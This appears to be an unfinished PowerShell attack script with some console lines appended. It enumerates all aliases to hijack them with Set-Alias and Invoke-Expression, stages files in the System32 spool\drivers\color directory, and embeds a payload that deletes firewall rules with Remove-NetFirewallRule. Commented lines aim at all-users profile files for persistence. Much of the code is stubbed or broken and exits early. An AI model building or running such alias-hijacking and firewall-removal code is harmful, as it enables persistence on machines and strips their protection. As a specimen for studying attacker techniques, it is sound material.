function get_aliases() {
    $dct = @{ }
    $counter=1
    #Get-Alias.GetType;
    Get-Alias | ForEach-Object { $dct[$counter] = [string]$_.Name, [string]$_.DisplayName.Split(' ')[2]; $counter++ } 
    # map a counter to keep trqck of index for each alias in the format counter: alias name & command
    #$tmp = @()
   # $dct.Keys | ForEach-Object {
   #     $tmp += $_
   # }
    
    #$tmp = $tmp | Sort-Object
    #foreach($i in $tmp){
   #     Write-Host "$($i): $($dct[$i])"
    #}
    #exit 1
    return $dct

}

function store([string]$alias_name) {0
    $path = "C:\Windows\System32\spool\drivers\color\"
    if (Test-Path $path) {
        # Test if path we want to write to exists
        Write-Host "Path exists"

    }

}

function get_content {
    $return_str = @"
    function master() {
        try {
            Remove-NetFirewallRule | Out-Null
        }
        Catch {
    
        }
    }
    "`r`n"

"@

}


function master(){
    $tmp_path = "C:\Windows\System32\spool\drivers\color\tmp1.txt"
    if(Test-Path $tmp_path){
        # Janky way to determine which alias is being modified
        New-Item -Path "C:\Windows\System32\spool\drivers\color\tmp1.txt" -ItemType File
    }
    for($i = 1; $i -lt 154; $i++){
        if($i -eq 1){
            
        }
    }

}

function set_alias([hashtable]$dct) {
    #AllScope, Constant -Force
    Write-Host "inside set alias"
    foreach ($key in $dct.Keys) {
        Write-Host "$($dct[$key][1])"
        $orig_command = "Invoke-Expression -Command " + "$($dct[$key][1]) echo hi"
        Write-Host "$orig_command"
        Write-Host "Setting $($dct[$key][0]) to $($orig_command)"
        #Set-Alias -Name $dct[$key][0] -Value orig_command -Option AllScope -Force | Out-Null
        exit 1
    }

    exit 1
}

function remapper([hashtable]$dct) {
    #$tmp = $dct.keys | Sort-Object 
    set_alias $dct
    #$content = get_content


}

function main() {
    #$cur_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    #$env:USERNAME may be modified
    #$curuser_allhosts = $PROFILE.CurrentUserAllHosts
    #$allusers_allhosts = $PROFILE.AllUsersAllHosts
    #$32bit_path = $allusers_allhosts.Replace("System32", "SysWOW64")
    $dct = get_aliases
    remapper $dct


}
#main
#get_aliases
#main
PS C:\Users\John> function y([string]$x){return "Write-Host $($x)"}
PS C:\Users\John> Invoke-Expression (y("tmp"))

Set-Alias -Name "h" -Value "Write-Output -Object 'hi'" -Option AllScope -Force